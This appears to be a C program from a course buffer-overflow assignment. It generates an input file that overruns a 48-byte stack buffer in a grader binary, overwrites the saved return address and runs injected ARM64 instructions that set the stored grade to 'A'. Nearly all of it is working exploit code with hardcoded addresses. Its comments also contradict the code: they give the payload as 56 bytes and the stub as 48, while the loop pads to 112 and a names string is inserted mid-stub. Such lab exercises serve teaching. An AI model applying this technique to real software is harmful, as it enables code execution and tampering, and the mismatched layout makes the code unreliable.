/*
 * createdataA.c
 *
 * Purpose:
 *   Emit "dataA" (56 bytes) which, when fed to the grader, will:
 *     – overflow readString’s buf[48] and smash its saved x30
 *       so that getName’s ret jumps into our stub in name[].
 *     – the stub (executing in name[] BSS, now RWX) will:
 *         * write 'A' into the global grade variable
 *         * branch to 0x40089c (the grader’s print-grade code)
 *   All stub instructions are assembled with MiniAssembler_*.
 */

#include <stdio.h>
#include "miniassembler.h"

int main(void)
{
    FILE           *f;
    unsigned long   pc;
    unsigned int    instr;
    int             i;

    /* These constants come from the grader’s map: */
    const unsigned long NAME_ADDR   = 0x420058UL;  /* start of name[] in BSS */
    const unsigned long GRADE_ADDR  = 0x420044UL;  /* &grade global ('D') */
    const unsigned long PRINT_ADDR  = 0x40089cUL;  /* skip-B, print-grade code */

    /* 1) Open the attack file for binary write */
    f = fopen("dataA", "wb");
    if (!f) return 1;



    /* 2) Emit a 48-byte stub into buf[] (and ultimately name[]): */
    pc = NAME_ADDR;  /* at runtime, the stub’s first instr is at NAME_ADDR */

    /* a) ADR  X0, GRADE_ADDR(PC)   ; X0 ← &grade       */
    instr = MiniAssembler_adr(0, GRADE_ADDR, pc);
    fwrite(&instr, 4, 1, f);  pc += 4;

    /* b) MOV  W1, #'A'             ; W1 ← ASCII 'A'   */
    instr = MiniAssembler_mov(1, (int)'A');
    fwrite(&instr, 4, 1, f);  pc += 4;

    /* c) STRB W1, [X0]             ; *(&grade) = 'A'  */
    instr = MiniAssembler_strb(1, 0);
    fwrite(&instr, 4, 1, f);  pc += 4;

    /* d) B    PRINT_ADDR(PC)       ; jump into grader’s printf */
    instr = MiniAssembler_b(PRINT_ADDR, pc);
    fwrite(&instr, 4, 1, f);  pc += 4;


    fprintf(f, "Ben Zhou and Owen Clarke");

    /* e) Pad stub out to 48 bytes with harmless MOV W0,#0 (acts like NOP) */
    for (; pc < NAME_ADDR + 112; pc += 4) {
        instr = MiniAssembler_mov(0, 0);
        fwrite(&instr, 4, 1, f);
    }

    /* 3) Overwrite readString’s saved x30 with NAME_ADDR
        so that when readString does `ret`, it jumps into our stub. */
    fwrite(&NAME_ADDR, sizeof(NAME_ADDR), 1, f);

    fclose(f);
    return 0;
}

 